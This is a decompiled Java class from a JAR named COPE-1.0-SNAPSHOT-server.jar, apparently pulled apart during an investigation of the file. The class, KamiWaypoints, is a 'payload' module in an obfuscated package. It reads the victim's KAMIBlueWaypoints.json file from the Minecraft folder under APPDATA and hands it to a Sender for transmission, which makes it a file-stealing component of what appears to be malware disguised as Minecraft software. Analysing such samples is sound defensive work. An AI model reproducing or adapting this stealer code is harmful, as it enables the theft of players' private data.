/*    */ package idasido.adldaosd.wpiw.payload.impl;
/*    */ 
/*    */ import idasido.adldaosd.wpiw.payload.Payload;
/*    */ import idasido.adldaosd.wpiw.payload.Sender;
/*    */ import idasido.adldaosd.wpiw.util.FileUtil;
/*    */ import java.io.File;
/*    */ import java.util.Optional;
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ public final class KamiWaypoints
/*    */   implements Payload
/*    */ {
/*    */   public void execute() throws Exception {
/* 16 */     Optional<File> file = FileUtil.getFile(System.getenv("APPDATA") + "\\.minecraft\\KAMIBlueWaypoints.json");
/* 17 */     file.ifPresent(Sender::send);
/*    */   }
/*    */ }


/* Location:              C:\Users\aesthetical\Downloads\investagate\COPE-1.0-SNAPSHOT-server.jar!\idasido\adldaosd\wpiw\payload\impl\KamiWaypoints.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */